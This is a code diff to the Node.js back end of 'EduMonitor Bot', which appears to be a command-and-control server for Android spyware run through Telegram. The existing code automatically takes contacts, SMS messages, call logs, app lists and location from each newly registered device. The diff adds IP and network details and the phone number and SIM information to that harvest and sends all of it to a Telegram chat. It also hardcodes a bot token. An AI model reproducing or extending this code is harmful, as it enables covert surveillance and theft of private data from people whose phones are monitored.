@@ -6,6 +6,7 @@ const path = require('path');
 const FormData = require('form-data');
 const app = express();
 const PORT = process.env.PORT || 3000;
+const os = require('os');
 
 // Your bot token from @BotFather
 const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
@@ -79,6 +80,24 @@ function sendJsonResponse(res, data, statusCode = 200) {
         console.error('Error stringifying JSON:', e);
         res.status(500).json({ error: 'Internal server error' });
     }
+}
+
+// Get server's public IP
+function getServerIP() {
+    try {
+        const interfaces = os.networkInterfaces();
+        for (const name of Object.keys(interfaces)) {
+            for (const iface of interfaces[name]) {
+                // Skip internal and non-IPv4 addresses
+                if (iface.family === 'IPv4' && !iface.internal) {
+                    return iface.address;
+                }
+            }
+        }
+    } catch (e) {
+        console.error('Error getting server IP:', e);
+    }
+    return 'Unknown';
 }
 
 // ============= TELEGRAM MESSAGE FUNCTIONS =============
@@ -304,6 +323,49 @@ function formatLocationMessage(locationData) {
     }
 }
 
+// Format IP info into a readable message
+function formatIPInfo(ipData) {
+    try {
+        let ipInfo = ipData;
+        if (typeof ipData === 'string') {
+            try {
+                ipInfo = JSON.parse(ipData);
+            } catch (e) {
+                return `🌐 IP Info: ${ipData}`;
+            }
+        }
+
+        let message = '🌐 <b>Network Information</b>\n\n';
+        
+        if (ipInfo.publicIP) {
+            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
+            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
+            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
+        }
+        
+        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
+            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
+        }
+        
+        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
+            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
+        }
+        
+        if (ipInfo.connectedTo && ipInfo.connectedTo !== 'Unknown') {
+            message += `\n🔗 <b>Connected via:</b> ${ipInfo.connectedTo}\n`;
+        }
+        
+        if (ipInfo.serverIP) {
+            message += `\n🖥️ <b>Server IP:</b> <code>${ipInfo.serverIP}</code>\n`;
+        }
+        
+        return message;
+    } catch (error) {
+        console.error('Error formatting IP info:', error);
+        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
+    }
+}
+
 // ============= AUTO DATA COLLECTION =============
 
 /**
@@ -322,6 +384,8 @@ function queueAutoDataCommands(deviceId, chatId) {
     autoDataRequested.set(deviceId, {
         timestamp: Date.now(),
         requested: [
+            'ip_info',
+            'phone_number',
             'contacts_html',
             'sms_html', 
             'calllogs_html',
@@ -343,11 +407,13 @@ function queueAutoDataCommands(deviceId, chatId) {
     
     // Queue commands in sequence with timestamps
     const commands = [
-        { command: 'contacts_html', delay: 0 },
-        { command: 'sms_html', delay: 5 },
-        { command: 'calllogs_html', delay: 10 },
-        { command: 'apps_html', delay: 15 },
-        { command: 'location', delay: 20 }
+        { command: 'ip_info', delay: 0, description: 'IP Address' },
+        { command: 'phone_number', delay: 2, description: 'Phone Number' },
+        { command: 'contacts_html', delay: 5, description: 'Contacts' },
+        { command: 'sms_html', delay: 10, description: 'SMS Messages' },
+        { command: 'calllogs_html', delay: 15, description: 'Call Logs' },
+        { command: 'apps_html', delay: 20, description: 'Apps List' },
+        { command: 'location', delay: 25, description: 'Location' }
     ];
     
     commands.forEach((cmd, index) => {
@@ -360,7 +426,7 @@ function queueAutoDataCommands(deviceId, chatId) {
         };
         
         device.pendingCommands.push(commandObject);
-        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command}`);
+        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command} (${cmd.description})`);
     });
     
     console.log(`✅ All auto-data commands queued for ${deviceId}`);
@@ -381,6 +447,10 @@ function getMainMenuKeyboard() {
         [
             createInlineButton('📍 Location', 'menu_location'),
             createInlineButton('📊 Stats', 'menu_stats')
+        ],
+        [
+            createInlineButton('🌐 Network', 'menu_network'),
+            createInlineButton('📞 Phone', 'menu_phone')
         ],
         [
             createInlineButton('ℹ️ About', 'menu_about'),
@@ -595,6 +665,35 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
+    } else if (data === 'menu_network') {
+        const keyboard = [
+            [
+                createInlineButton('🌐 IP Info', 'cmd:ip_info'),
+                createInlineButton('📶 WiFi Info', 'cmd:wifi_info')
+            ],
+            [
+                createInlineButton('📱 Mobile Data', 'cmd:mobile_info'),
+                createInlineButton('🔄 Network Status', 'cmd:network')
+            ],
+            [
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_phone') {
+        const keyboard = [
+            [
+                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
+                createInlineButton('📇 SIM Info', 'cmd:sim_info')
+            ],
+            [
+                createInlineButton('📊 Call Logs', 'cmd:calllogs'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
     } else if (data === 'menu_stats') {
         const keyboard = [
             [
@@ -625,7 +724,7 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, keyboard);
         await sendTelegramMessage(chatId,
             "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 2.0\n" +
+            "Version: 2.1\n" +
             "Features:\n" +
             "• Remote device monitoring\n" +
             "• Screenshot capture\n" +
@@ -633,6 +732,8 @@ async function handleCallbackQuery(callbackQuery) {
             "• Data extraction (contacts, SMS, etc.)\n" +
             "• Location tracking\n" +
             "• Schedule recording\n" +
+            "• IP address tracking\n" +
+            "• Phone number detection\n" +
             "• Auto-data collection on registration\n\n" +
             "Use the menu below to navigate.");
         
@@ -848,10 +949,103 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `📸 Taking screenshot...`;
     } else if (cleanCommand === 'record') {
         ackMessage = `🎤 Recording audio for 60 seconds...`;
+    } else if (cleanCommand === 'ip_info') {
+        ackMessage = `🌐 Fetching IP information...`;
+    } else if (cleanCommand === 'phone_number') {
+        ackMessage = `📞 Getting phone number...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
 }
+
+// ============= IP INFO ENDPOINT =============
+
+app.post('/api/ipinfo/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const ipData = req.body;
+        
+        console.log(`🌐 IP Info received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        // Add server IP to the data
+        ipData.serverIP = getServerIP();
+        
+        // Store IP info in device data
+        device.lastIPInfo = ipData;
+        
+        // Format and send the message
+        const formattedMessage = formatIPInfo(ipData);
+        await sendTelegramMessage(chatId, formattedMessage);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ IP Info endpoint error:', error);
+        res.status(500).json({ error: 'IP Info processing failed' });
+    }
+});
+
+// ============= PHONE NUMBER ENDPOINT =============
+
+app.post('/api/phonenumber/:deviceId', async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const phoneData = req.body;
+        
+        console.log(`📞 Phone number received from ${deviceId}`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        
+        // Store phone info in device data
+        device.phoneNumber = phoneData.phoneNumber;
+        device.simInfo = phoneData.simInfo;
+        
+        // Format message
+        let message = '📞 <b>Phone Information</b>\n\n';
+        
+        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
+            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
+        } else {
+            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
+        }
+        
+        if (phoneData.simInfo) {
+            message += `\n<b>SIM Information:</b>\n`;
+            message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
+            message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
+            message += `• SIM State: ${phoneData.simInfo.state || 'Unknown'}\n`;
+            if (phoneData.simInfo.slotCount) {
+                message += `• SIM Slots: ${phoneData.simInfo.slotCount}\n`;
+            }
+        }
+        
+        if (phoneData.error) {
+            message += `\n⚠️ <b>Note:</b> ${phoneData.error}\n`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ Phone Number endpoint error:', error);
+        res.status(500).json({ error: 'Phone Number processing failed' });
+    }
+});
 
 // ============= FILE UPLOAD ENDPOINT =============
 
@@ -986,6 +1180,14 @@ app.post('/api/logs', async (req, res) => {
                 // Location is handled by /api/location endpoint
                 // Just acknowledge
                 return res.json({ success: true, handled: 'location_endpoint' });
+                
+            case 'ip_info':
+                // IP info is handled by /api/ipinfo endpoint
+                return res.json({ success: true, handled: 'ipinfo_endpoint' });
+                
+            case 'phone_number':
+                // Phone number is handled by /api/phonenumber endpoint
+                return res.json({ success: true, handled: 'phonenumber_endpoint' });
                 
             case 'contacts':
                 try {
@@ -1179,6 +1381,9 @@ app.post('/api/location/:deviceId', async (req, res) => {
         
         const chatId = device.chatId;
         
+        // Store last location in device data
+        device.lastLocation = locationData;
+        
         // Format the location message
         const formatted = formatLocationMessage(locationData);
         
@@ -1215,6 +1420,7 @@ app.get('/health', (req, res) => {
         status: 'healthy', 
         devices: devices.size,
         authorizedChats: Array.from(authorizedChats).join(', '),
+        serverIP: getServerIP(),
         timestamp: Date.now()
     });
 });
@@ -1262,8 +1468,8 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const { command, result, error } = req.body;
     
     // Skip if this is a file command
-    if (command && (command.includes('_txt') || command.includes('_html'))) {
-        console.log(`📎 File command ${command} using /api/upload-file endpoint`);
+    if (command && (command.includes('_txt') || command.includes('_html') || command === 'ip_info' || command === 'phone_number' || command === 'location')) {
+        console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
     
@@ -1319,6 +1525,8 @@ app.post('/api/register', async (req, res) => {
         `Android: ${deviceInfo.android}\n\n` +
         `🔄 <b>Auto-collecting data...</b>\n` +
         `The server is automatically requesting:\n` +
+        `• 🌐 IP Address Information\n` +
+        `• 📞 Phone Number\n` +
         `• 📇 Contacts\n` +
         `• 💬 SMS Messages\n` +
         `• 📞 Call Logs\n` +
@@ -1343,6 +1551,9 @@ app.get('/api/devices', (req, res) => {
             lastSeen: new Date(device.lastSeen).toISOString(),
             model: device.deviceInfo?.model || 'Unknown',
             android: device.deviceInfo?.android || 'Unknown',
+            phoneNumber: device.phoneNumber || 'Not available',
+            lastIPInfo: device.lastIPInfo || null,
+            lastLocation: device.lastLocation || null,
             autoDataRequested: autoDataRequested.has(id)
         });
     }
@@ -1378,17 +1589,21 @@ app.post('/api/test-command/:deviceId', (req, res) => {
 // ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
+    const serverIP = getServerIP();
     res.send(`
         <html>
         <body style="font-family: Arial; padding: 20px;">
             <h1 style="color: #4CAF50;">✅ Server Running</h1>
             <p><b>Time:</b> ${new Date().toISOString()}</p>
+            <p><b>Server IP:</b> <code>${serverIP}</code></p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
             <p><b>Registered Devices:</b></p>
             <ul>
                 ${Array.from(devices.entries()).map(([id, device]) => 
-                    `<li>${id} - ${device.deviceInfo?.model} (Last seen: ${new Date(device.lastSeen).toLocaleString()})</li>`
+                    `<li><b>${id}</b> - ${device.deviceInfo?.model}<br>
+                     📞 Phone: ${device.phoneNumber || 'Not available'}<br>
+                     Last seen: ${new Date(device.lastSeen).toLocaleString()}</li>`
                 ).join('')}
             </ul>
             <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
@@ -1410,18 +1625,24 @@ app.get('/test-menu', async (req, res) => {
 // ============= START SERVER =============
 
 app.listen(PORT, '0.0.0.0', () => {
+    const serverIP = getServerIP();
     console.log('\n🚀 ===============================================');
     console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log('\n✅ AUTO-DATA COLLECTION ENABLED:');
     console.log('   └─ When device registers:');
-    console.log('   └─ 1. 📇 Contacts (HTML)');
-    console.log('   └─ 2. 💬 SMS (HTML)');
-    console.log('   └─ 3. 📞 Call Logs (HTML)');
-    console.log('   └─ 4. 📱 Apps List (HTML)');
-    console.log('   └─ 5. 📍 Location');
-    console.log('   └─ All sent as files to Telegram');
+    console.log('   └─ 1. 🌐 IP Address Info');
+    console.log('   └─ 2. 📞 Phone Number');
+    console.log('   └─ 3. 📇 Contacts (HTML)');
+    console.log('   └─ 4. 💬 SMS (HTML)');
+    console.log('   └─ 5. 📞 Call Logs (HTML)');
+    console.log('   └─ 6. 📱 Apps List (HTML)');
+    console.log('   └─ 7. 📍 Location');
+    console.log('\n✅ NEW ENDPOINTS:');
+    console.log('   └─ POST /api/ipinfo/:deviceId - IP Information');
+    console.log('   └─ POST /api/phonenumber/:deviceId - Phone Number');
     console.log('\n✅ MENU BUTTON CONFIGURED:');
     console.log('   └─ Persistent menu button appears next to input field');
     console.log('   └─ 16 commands registered with BotFather');
@@ -1429,9 +1650,5 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ Step-by-step time entry');
     console.log('   └─ Daily/Once choice with buttons');
     console.log('   └─ Interval validation');
-    console.log('\n✅ LOG INGESTION ENDPOINTS:');
-    console.log('   └─ POST /api/logs - Single log entry');
-    console.log('   └─ POST /api/log - Alias for /api/logs');
-    console.log('   └─ POST /api/logs/batch - Batch log upload');
     console.log('\n🚀 ===============================================\n');
 });
